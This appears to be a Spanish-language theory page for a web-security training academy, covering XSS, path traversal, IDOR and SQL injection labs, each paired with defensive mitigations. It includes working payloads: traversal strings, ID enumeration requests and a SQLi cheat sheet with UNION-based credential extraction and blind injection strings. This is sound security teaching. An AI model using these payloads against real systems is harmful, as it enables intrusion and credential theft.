Teoría — vulnerabilidades web (labs recientes)

Conceptos aplicados a los retos XSS-01, PT-01 e IDOR-01 del catálogo unificado.

Cross-Site Scripting (XSS)

El XSS permite inyectar JavaScript en páginas vistas por otras víctimas. En el lab XSS-01 el vector es almacenado: el payload persiste en un comentario y un bot moderador lo “revisa” (simulación sin motor JS real).

Tipos (referencia)

  • Reflejado — el payload viaja en la petición y se refleja en la respuesta (URL, búsqueda).
  • Almacenado — se guarda en BD/archivo y se sirve a futuros visitantes (comentarios, perfil).
  • DOM-based — el sink está solo en JavaScript del cliente (innerHTML, document.write).

Metodología en FlyPaper (XSS-01)

  1. Publicar contenido HTML sin sanitizar

    El lab acepta comentarios que incluyan etiquetas script.

    <script>... ruta /objetivos/xss/01/robo-cookie ...</script>
  2. Disparar el bot — POST /objetivos/xss/01/admin-revisar marca comentarios explotables.
  3. Robo simulado — GET con token_robo devuelve la flag (equivalente pedagógico a exfiltrar cookie de admin).
Lab XSS-01 Writeup XSS-01

Blue Team

Codifica salida según contexto (HTML, atributo, JS). CSP restrictiva, cookies HttpOnly y Secure, sanitización en servidor (allowlist), no confiar solo en un bot que “lee” comentarios.

Path Traversal / LFI

Ocurre cuando la aplicación usa entrada del usuario para construir rutas de fichero sin normalizar ni acotar el directorio permitido. Secuencias ../ suben niveles en el árbol de archivos.

Patrón vulnerable (PT-01)

Concatenación sin validación previa

ruta = carpeta_publica + parametro_usuario   # file=../archivos_secretos/flag.txt

Contención en el lab

Tras resolve(), FlyPaper exige que la ruta final siga bajo app/ctf_pathtraversal/. Puedes alcanzar archivos_secretos/ dentro del módulo, pero no leer /etc/passwd ni ficheros fuera del sandbox. 

GET /objetivos/pathtraversal/01/descargar?file=../archivos_secretos/flag.txt
Lab PT-01 Writeup PT-01

Blue Team

Usar basename() + lista blanca de nombres, almacenar secretos fuera del webroot, comprobar prefijo con Path.resolve().is_relative_to(base) (Python 3.9+).

IDOR (Insecure Direct Object Reference)

El cliente envía un identificador de recurso (ID de nómina, factura, pedido) y el servidor autentica al usuario pero no autoriza el acceso a ese objeto concreto.

Escenario IDOR-01

  • Al iniciar el reto se te asigna una nómina propia (ID 2–6) en sesión.
  • El endpoint /objetivos/idor/01/nomina/<id> comprueba sesión del reto, no que id sea el tuyo.
  • Enumerar id=1 expone la nómina del director financiero (flag).
GET /objetivos/idor/01/nomina/1
GET /objetivos/idor/01/nomina/1?json=1
Lab IDOR-01 Writeup IDOR-01

Blue Team

Comprobar en servidor: recurso.propietario_id == usuario_actual (o RBAC). IDs opacos (UUID), rate limiting en enumeración, auditoría de accesos a datos sensibles.

Teoría — SQL Injection (labs 01–04)

Cheat sheet SQLite, UNION, blind y mitigaciones para la ruta clásica de la academia.

Introducción a la Inyección SQL

La inyección SQL (SQLi) ocurre cuando la aplicación concatena entrada de usuario directamente en una consulta. Se rompe la frontera entre código (la sentencia SQL) y datos (el valor del usuario): el atacante inyecta fragmentos que el motor interpreta como lógica, no como literales.

Caso práctico — lógica del honeypot

Consulta base (vulnerable)

SELECT * FROM productos WHERE nombre = '$INPUT';

Payload de alteración de contexto

' OR '1'='1

Consulta resultante (devuelve todo el inventario)

SELECT * FROM productos WHERE nombre = '' OR '1'='1';
La condición '1'='1' es siempre verdadera: el filtro por nombre deja de limitar filas. Es el mismo patrón que practicarás en /objetivos/sqli/ cuando el login o las consultas del lab concatenan sin parámetros.

Metodologías de explotación (Labs 01–04)

A. UNION-based attacks

Combina el resultado de la consulta original con filas fabricadas por el atacante. El número y tipos de columnas del UNION SELECT deben coincidir con la consulta víctima.

  1. Determinar el número de columnas

    Incrementa ORDER BY N hasta provocar error, o prueba nulos: 

    ' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL,NULL--
    La consulta falla hasta clavar el número exacto de columnas. Sin ese match, el UNION no ejecuta.
  2. String mapping (columnas que admiten texto)

    Sustituye cada NULL por un literal de prueba ('a') para ver qué posiciones se reflejan en la UI sin romper el motor: 

    ' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
  3. Exfiltración y concatenación

    Con pocas columnas de texto, unifica campos con el operador del DBMS (en SQLite: ||): 

    ' UNION SELECT username || ':' || password, NULL FROM usuarios--

B. Blind SQL Injection

Cuando no hay errores SQL ni datos reflejados, infieres verdad/falsedad por cambios sutiles de respuesta o por tiempo.

1. Respuestas condicionales (boolean-based)

Observa diferencias HTML/cookies (p. ej. presencia de «WELCOME BACK»). Compara afirmaciones verdaderas vs falsas: 

TrackingId: xyz' AND '1'='1
TrackingId: xyz' AND '1'='0

Extrae caracteres con fuerza bruta + subcadena (base 1): 

' AND SUBSTR((SELECT password FROM usuarios LIMIT 1),1,1)='a'--

2. Time-based

Si el HTML no cambia, fuerza un delay solo cuando la condición es verdadera (sintaxis según motor; en labs SQLite suele preferirse boolean/UNION). 

-- Ejemplo conceptual (MySQL): WAITFOR / SLEEP
' AND IF(SUBSTR(@@version,1,1)='5', SLEEP(3), 0)--

C. Enumeración de bases de datos

  1. Identificar el DBMS — errores de sintaxis o funciones de versión (sqlite_version(), @@version, version().
  2. Mapear tablas / esquema — en SQLite: sqlite_master.
  3. Extraer credenciales — columnas de interés vía UNION o blind una vez conocido el esquema. 
SELECT tbl_name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE tbl_name='usuarios';

SQLi — perspectiva Blue Team

El error clásico (estilo honeypot)

Los filtros por blacklist (quitar comillas, bloquear palabras clave como UNION / SELECT) fallan ante ofuscación, encoding, comentarios anidados y variantes por DBMS. Son útiles como señal WAF, no como control primario.

En FlyPaper los labs de la academia (SQLi, zona /secure/search, etc.) simulan código vulnerable a propósito; el buscador /search del portal ya usa consultas parametrizadas.

La solución definitiva: consultas parametrizadas

Separa la plantilla SQL de los valores. El motor trata la entrada como literal, nunca como sintaxis.

❌ Vulnerable (concatenación / f-string)

cursor.execute(f"SELECT * FROM usuarios WHERE id = '{user_id}'")

Código blindado (SQLite / Python)

cursor.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
Misma idea en otros stacks: placeholders %s / named params, ORMs con bind, prepared statements JDBC. Nunca interpoles input en el string SQL.
